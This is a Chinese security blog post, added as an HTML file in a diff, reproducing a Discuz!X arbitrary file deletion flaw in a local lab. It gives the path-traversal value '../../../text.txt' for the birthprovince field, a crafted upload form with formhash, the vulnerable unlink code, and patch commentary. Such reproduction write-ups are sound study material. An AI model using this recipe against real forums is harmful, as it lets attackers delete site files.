@@ -1,0 +1,171 @@
+<!DOCTYPE html>
+<html lang="zh-cmn-Hans">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <meta http-equiv="X-UA-Compatible" content="ie=edge">
+  <title>discuz任意文件删除漏洞复现 | XUPTSEC&#39;s blog</title>
+  
+    <link rel="icon" href="/assets/favicon.png">
+  
+  
+  
+  <!--link rel="stylesheet" href="//cdn.jsdelivr.net/highlight.js/9.10.0/styles/github-gist.min.css"-->
+  <link rel="stylesheet" href="//cdn.jsdelivr.net/highlight.js/9.10.0/styles/github-gist.min.css">
+  <link rel="stylesheet" href="/css/style.css">
+</head>
+
+<body>
+<div class="Shell">
+    <aside class='SideBar'>
+    <section class='avatar' style="background-image: url(/assets/header.png)">
+        <div class='av-pic' style="background-image: url(/assets/favicon.png)">
+        </div>
+    </section>
+    <section class='menu'>
+        <div>XUPTSEC&#39;s blog</div>
+        
+        <ul>
+          
+            <a href="/" class="Btn">
+              <li>Home</li>
+            </a>  
+          
+            <a href="/archives/" class="Btn">
+              <li>Archive</li>
+            </a>  
+          
+        </ul>
+    </section>
+    <section class="media">
+        
+            
+                <a href="https://github.com/xuptsec-admin">
+                    <img src="/assets/github.svg" />
+                </a>
+            
+        
+    </section>
+</aside>
+
+    <div class="container">
+        <div data-pager-shell>
+            <div>
+  <article class='ContentView'>
+    <header class='PageTitle'>
+        <h1>discuz任意文件删除漏洞复现</h1>
+    </header>
+
+    <section>
+      <h1 id="Discuz任意文件删除漏洞复现"><a href="#Discuz任意文件删除漏洞复现" class="headerlink" title="Discuz任意文件删除漏洞复现"></a>Discuz任意文件删除漏洞复现</h1><h2 id="0x00-概述"><a href="#0x00-概述" class="headerlink" title="0x00 概述"></a><strong>0x00 概述</strong></h2><p><strong>Discuz!X**</strong>社区软件，是一个采用<strong> </strong>PHP<strong> </strong>和<strong> </strong>MySQL<strong> </strong>等其他多种数据库构建的性能优异、功能全面、安全稳定的社区论坛平台。但是任何代码都会因为不可避免的原因而存在着安全问题。这次的任意文件删除一是因为后台变量没有对前端传回的数据做校验，理论上下拉框只能传回框中的数据（选择框同理），传来什么就是什么。如果不是，那么肯定是被人改过，直接扔掉这个包并记录<strong><strong>IP</strong></strong>；二是因为<strong><strong>Discuz</strong></strong>的功能很全，有删除文件的功能，但是权限管理的不好。删除文件这种敏感的操作应该做一些限制。这里恰好删除文件的代码里面包含着可以被修改的数据，于是漏洞就产生了。**</p>
+<h2 id="0x01-漏洞复现"><a href="#0x01-漏洞复现" class="headerlink" title="0x01 漏洞复现"></a><strong>0x01 漏洞复现</strong></h2><p><strong>环境：win10+phpstudy（php5.6）+discuz3.2（2.8-3.3都可以）</strong></p>
+<p><strong>0x00、创建一个测试文件text.txt到网站根目录下</strong></p>
+<p><strong>0x01、找到formhash的值</strong></p>
+<p><strong>0x02、修改某一表单的值为测试文件的相对位置../../../text.txt</strong></p>
+<p><strong>0x03、上传图片到上述表单的变量中（直接POST或者自己构造表单）</strong></p>
+<p><strong>0x04、删除成功</strong></p>
+<p><img src="http://120.76.142.240/wp-content/uploads/2017/12/1.png" alt="img"></p>
+<p>进入自己的个人资料页面，找到出生地</p>
+<p><img src="http://120.76.142.240/wp-content/uploads/2017/12/2.png" alt="img"></p>
+<p>用burp抓包直接改为../../../text.txt</p>
+<p><img src="http://120.76.142.240/wp-content/uploads/2017/12/3.png" alt="img"></p>
+<p>找到formhash的值</p>
+<p><img src="http://120.76.142.240/wp-content/uploads/2017/12/5.png" alt="img"></p>
+<p><strong>构造上传文件的表单，上传图片</strong></p>
+<ul>
+<li><strong>&lt;form action=”<a href="http://localhost/upload/home.php?mod=spacecp&amp;ac=profile&amp;op=base”" target="_blank" rel="noopener">http://localhost/upload/home.php?mod=spacecp&amp;ac=profile&amp;op=base”</a> method=”POST” enctype=”multipart/form-data”&gt;</strong></li>
+<li><strong><input type="file" name="birthprovince" id="file"></strong></li>
+<li><strong><input type="text" name="formhash" value="c2e379bc"><p></p></strong></li>
+<li><strong><input type="”text”" name="”profilesubmit”" value="”1″/"><p></p></strong></li>
+<li><strong><input type="”submit”" value="”Submit”"></strong></li>
+<li><strong></strong></li>
+</ul>
+<p><img src="http://120.76.142.240/wp-content/uploads/2017/12/y.png" alt="img"></p>
+<h3 id="上传任意图片文件"><a href="#上传任意图片文件" class="headerlink" title="上传任意图片文件"></a>上传任意图片文件</h3><p><img src="http://120.76.142.240/wp-content/uploads/2017/12/234.png" alt="img"></p>
+<h3 id="查看网站目录，-text-txt已经成功删除"><a href="#查看网站目录，-text-txt已经成功删除" class="headerlink" title="查看网站目录， text.txt已经成功删除"></a>查看网站目录， text.txt已经成功删除</h3><p><img src="http://120.76.142.240/wp-content/uploads/2017/12/1-2.png" alt="img"></p>
+<h2 id="0x02-漏洞原理"><a href="#0x02-漏洞原理" class="headerlink" title="0x02 漏洞原理"></a><strong>0x02 漏洞原理</strong></h2><p><strong>先看的官方补丁：之间删除了所有的unlike语句</strong></p>
+<p><img src="http://120.76.142.240/wp-content/uploads/2017/12/2-1.png" alt="img"></p>
+<p><strong>倒着看，unlike用来删除文件：</strong></p>
+<ul>
+<li><p><strong>@unlink(getglobal(‘setting/attachdir’).’./profile/’.$verifyinfo[‘field’][$key]);</strong></p>
+</li>
+<li><p><strong>所以是向上三级目录../../../</strong></p>
+</li>
+<li><strong>向上看，有一段判断文件是否上传成功的代码</strong></li>
+</ul>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>($_FILES) &#123;</span><br><span class="line">    $upload = <span class="keyword">new</span> discuz_upload(); </span><br><span class="line">    <span class="keyword">foreach</span>($_FILES <span class="keyword">as</span> $key =&gt; $file)&#123; </span><br><span class="line">        <span class="keyword">if</span>(!<span class="keyword">isset</span>($_G[‘cache’][‘profilesetting’][$key]))&#123; </span><br><span class="line">            <span class="keyword">continue</span>; </span><br><span class="line">        &#125; <span class="comment">/*这里是一些检查文件是否上传成功的代码，如果不成功会做相应的反应*/</span></span><br><span class="line">        @unlink(getglobal(‘setting/attachdir’).’./profile/’.$space[$key]);</span><br><span class="line">        $setarr[$key] = $attach[‘attachment’];</span><br><span class="line">	&#125; </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<ul>
+<li><strong>看到space这个变量</strong></li>
+<li><strong>看看space_merge这个函数，是用来设置个人信息的</strong></li>
+<li><strong>于是在其中就找到一个变量，让其变成文件路径，上面复现的时候选的这个变量是出生地（birthprovince），之后你上传了一个文件后，就会执行@unlink(getglobal(<a href="mailto:%E5%B0%B1%E4%BC%9A%E6%89%A7%E8%A1%8C@unlink(getglobal(%E2%80%98setting/attachdir%E2%80%99" target="_blank" rel="noopener">‘</a>.%E2%80%98./profile/%E2%80%99.$space%5b$key%5d))setting/attachdir<a href="mailto:%E5%B0%B1%E4%BC%9A%E6%89%A7%E8%A1%8C@unlink(getglobal(%E2%80%98setting/attachdir%E2%80%99" target="_blank" rel="noopener">’</a>.%E2%80%98./profile/%E2%80%99.$space%5b$key%5d))<a href="mailto:%E5%B0%B1%E4%BC%9A%E6%89%A7%E8%A1%8C@unlink(getglobal(%E2%80%98setting/attachdir%E2%80%99" target="_blank" rel="noopener">).</a>.%E2%80%98./profile/%E2%80%99.$space%5b$key%5d))<a href="mailto:%E5%B0%B1%E4%BC%9A%E6%89%A7%E8%A1%8C@unlink(getglobal(%E2%80%98setting/attachdir%E2%80%99" target="_blank" rel="noopener">‘</a>.%E2%80%98./profile/%E2%80%99.$space%5b$key%5d))./profile/<a href="mailto:%E5%B0%B1%E4%BC%9A%E6%89%A7%E8%A1%8C@unlink(getglobal(%E2%80%98setting/attachdir%E2%80%99" target="_blank" rel="noopener">’</a>.%E2%80%98./profile/%E2%80%99.$space%5b$key%5d)).$space[$key])</strong>;**</li>
+<li><strong>而这个时候$space这个变量里是我们刚刚改的任意文件的路径，于是乎就删除了这个文件</strong></li>
+</ul>
+<h1 id="0x03-写在最后"><a href="#0x03-写在最后" class="headerlink" title="0x03 写在最后"></a><strong>0x03 写在最后</strong></h1><ul>
+<li><strong>代码功底十分重要，需要加强。</strong></li>
+<li><strong>漏洞复现一定要亲自搭环境去试试，不能光看别人做，在做的过程中会遇到很多想不到的问题，同时也能学到不少东西。</strong></li>
+<li><strong>多关注安全动态，目前最新的书上的东西也已经落后现在起码1-2年了</strong></li>
+<li><strong>一定要刨根问底，有的时候一些细节可能正是问题的关键。比如说这次的目录问题，为什么是向上三级，看了代码之后才彻底明白，这是个很关键的地方。</strong></li>
+<li><strong>官方的补丁直接把所有unlike语句全部删除了，虽然确实是不能删除文件了。但是理论上来说应该把前后端都做校验，删除文件的语句要检查权限。</strong></li>
+</ul>
+
+
+      
+
+    </section>
+    
+      <section class='ArticleMeta'>
+          <div>
+            发布于&nbsp;
+            <time datetime="2018-09-11T10:21:26.000Z" itemprop="datePublished">
+              2018-09-11
+            </time>
+          </div>
+          
+            <div>
+              tags: 
+  <li class="meta-text">
+  { <a href="/tags/web/">web</a> }
+  </li>
+
+  <li class="meta-text">
+  { <a href="/tags/任意文件删除/">任意文件删除</a> }
+  </li>
+
+  <li class="meta-text">
+  { <a href="/tags/漏洞复现/">漏洞复现</a> }
+  </li>
+
+
+            </div>
+          
+      </section>
+    
+    
+</article>
+
+  
+</div>
+
+            <footer>
+    <div>© 2018 - XUPTSEC </div>
+    <div>
+        <span>
+            Powered by <a href="https://hexo.io">Hexo</a>
+        </span>
+        ,
+        <span>
+            Theme - <a href="https://github.com/nameoverflow/hexo-theme-icalm">Icalm</a>
+        </span>
+    </div>
+</footer>
+
+        </div>
+    </div>
+</div>
+<script src="/js/pager/dist/singlepager.js"></script>
+<script>
+var sp = new Pager('data-pager-shell')
+
+</script>
+</body>
+</html>
